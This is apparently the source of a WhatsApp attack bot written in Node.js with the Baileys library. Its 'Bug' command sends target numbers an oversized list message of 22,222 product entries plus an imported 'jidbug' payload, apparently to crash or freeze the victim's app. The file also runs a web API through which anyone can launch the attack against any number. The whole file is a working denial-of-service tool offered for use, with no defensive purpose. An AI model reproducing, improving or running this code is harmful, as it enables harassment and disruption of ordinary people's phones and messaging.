require('./ORGANIZAÇÃO/config');
const { BufferJSON, downloadContentFromMessage, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');
const os = require('os');
const fs = require('fs');
const fsx = require('fs-extra');
const path = require('path');
const util = require('util');
const chalk = require('chalk');
const moment = require('moment-timezone');
const speed = require('performance-now');
const ms = toMs = require('ms');
const axios = require('axios');
const fetch = require('node-fetch');
const { exec, spawn, execSync } = require("child_process");
const { performance } = require('perf_hooks');
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./ORGANIZAÇÃO/lib/myfunc');
const { fetchBuffer, buffergif } = require("./ORGANIZAÇÃO/lib/myfunc2");
const express = require('express'); 
const bodyParser = require('body-parser'); 
const { jidbug } = require("./ORGANIZAÇÃO/jidbug.js");
const app = express();
const PORT = 3000;


app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'))); 

// Função para executar comandos
const refID = "@s.whatsapp.net";
const executeCommand = async (command, numeroAlvo) => {
    try {
        switch (command) {
            case "Bug": {
            
                let products = [];
                for (let i = 0; i < 22222; i++) {
                    products.push({
                        "productId": "4120139628109348"
                    });
                }
            
                await mmzin.relayMessage(
                    numeroAlvo + refID,
                    {
                        "listMessage": {
                            "title": ``,
                            "description": `⛩️ PROJECT SHAKA ⛩️ \n\n ${jidbug}\n ${jidbug}`,
                            "buttonText": "2M",
                            "listType": 2, // PRODUCT_LIST
                            "productListInfo": {
                                "productSections": [
                                    {
                                        "title": "LIST_CATALOG",
                                        "products": products // Usa o array gerado com 1000 IDs
                                    }
                                ],
                                "headerImage": {
                                    "productId": "5512997675520"
                                },
                                "businessOwnerJid": "5512997675520@s.whatsapp.net"
                            },
                            "contextInfo": {
                                "mentionedJid": [
                                    "5512997675520@s.whatsapp.net"
                                ],
                                "forwardingScore": 1,
                                "isForwarded": true
                            }
                        }
                    },{ participant: { jid: numeroAlvo + refID } }
                );
            
                break;
            }
            case "removerbug":
                await mmzin.sendMessage(numeroAlvo + refID, { text: "⛩️ PROJECT SHAKA ⛩️" });
                break;
            default:
                console.log(`2M ANT WEB KRL`);
                break;
        }
    } catch (err) {
        console.error(`Erro ao executar o comando ${command}: ${err.message}`);
    }
};


module.exports = conn = async (conn, m, chatUpdate, store) => {
    mmzin = conn; 
    mek = m;
    info = m;

    try {
        prefa = global.prefix;
        const body = m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "messageContextInfo" ? m.text : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : "";
        const budy = (typeof m.text == 'string' ? m.text : '');
        global.prefa = ['!', '.'];
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
        global.prefix = prefix;
        const isCmd = body.startsWith(prefix);
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const q = args.join(" ");
        const { quotedMsg, mentioned, now, fromMe } = m;
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const numeroAlvo = mek.key.remoteJid; 
        const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
        const isBot = info.key.fromMe ? true : false;
        const isGroup = numeroAlvo.endsWith('@g.us');
        const sender = mek.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid;
        const groupMetadata = m.isGroup ? await mmzin.groupMetadata(numeroAlvo).catch(e => {}) : '';
        const groupName = m.isGroup ? groupMetadata.subject : '';
        const participants = m.isGroup ? await groupMetadata.participants : '';
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : '';
        const content = JSON.stringify(m.message);
        const participantes = m.isGroup ? await groupMetadata.participants : '';


        if (isCmd) {
            await executeCommand(command, numeroAlvo);
        }

    } catch (err) {
        console.log(util.format(err));
    }
};

// Rota para executar comandos via o site (api reset via site kkkkk)
app.post('/execute', async (req, res) => {
    const command = req.body.command; 
    const numeroAlvo = req.body.from; 
    console.log(`Comando recebido: ${command} de ${numeroAlvo}`);

    try {
        await executeCommand(command, numeroAlvo); 
        res.send(`'${command}' enviado com sucesso!`);
    } catch (err) {
        res.status(500).send(`Erro ao executar comando: ${err.message}`);
    }
});


app.get('/api-bug/:command', async (req, res) => {
    const command = req.params.command; 
    const numeroAlvo = req.query.n; 
    
    if (!numeroAlvo) {
        return res.status(400).json({ error: 'Número não fornecido' });
    }

    console.log(`Comando '${command}' será enviado para o número: ${numeroAlvo}`);

    try {
        await executeCommand(command, numeroAlvo); // Chama a função para executar o comando com o número fornecido
        res.json({ status: 'success', message: `${command} Injetado com sucesso`, alvo: `${numeroAlvo}` });
    } catch (err) {
        res.status(500).json({ status: 'error', message: `Algo deu errado. caso continue entre em contato com um DEV` });
    }
});

// Rota principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html')); // Serve a página HTML
});

// Inicia sa prr desse servidor
app.listen(PORT, () => {
 console.log(`Servidor rodando em http://localhost:${PORT}`);
});


let file = require.resolve(__filename);
fs.watchFile(file, async () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright(`Update ${__filename}`));           
    delete require.cache[file];
    require(file);
});


process.on('uncaughtException', function (err) {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("already-exists")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    console.log('Caught exception: ', err);
});
